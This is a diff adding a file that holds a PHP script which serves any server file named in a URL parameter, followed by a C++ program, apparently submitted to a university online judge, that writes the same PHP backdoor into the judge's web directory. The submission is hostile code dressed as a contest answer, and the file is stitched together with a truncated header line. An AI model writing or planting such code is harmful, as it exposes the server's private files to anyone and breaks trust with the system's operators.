@@ -1,0 +1,26 @@
+<?php
+if(isset($_GET[filename]) and $_GET[filename]!=""){
+$file = $_GET[filename];
+if (file_exists($file)) {header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename='.basename($file));header('Content-Transfer-Encoding: binary'); header('Expires: 0');header('Cache-Control: must-revalidate, post-check=0, pre-check=0');header('Pragma: public');header('Content-Length: ' . filesize($file));ob_clean();flush(); readfile($file); exit;}}?>
+
+
+
+em#: 5159
+// Submission#: 1427947
+// The source code is licensed under Creative Commons Attribution-NonCommercial-ShareAlike 3.0 Unported License
+// URI: http://creativecommons.org/licenses/by-nc-sa/3.0/
+// All Copyright reserved by Informatic Lab of Sun Yat-sen University
+#include<fstream>
+#include<iostream>
+using namespace std;
+int fileHandling(char *s){
+ofstream outfile;
+outfile.open("/home/iladmin/sicily/web/temp1.php");
+outfile<<"<?php"<<endl
+        <<"if(isset($_GET[filename]) and $_GET[filename]!=""){"<<endl
+        <<"$file = $_GET[filename];"<<endl
+        <<"if (file_exists($file)) {header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename='.basename($file));header('Content-Transfer-Encoding: binary'); header('Expires: 0');header('Cache-Control: must-revalidate, post-check=0, pre-check=0');header('Pragma: public');header('Content-Length: ' . filesize($file));ob_clean();flush(); readfile($file); exit;}}?>"<<endl
+        <<endl;
+outfile.close();
+return 0;
+}                                 
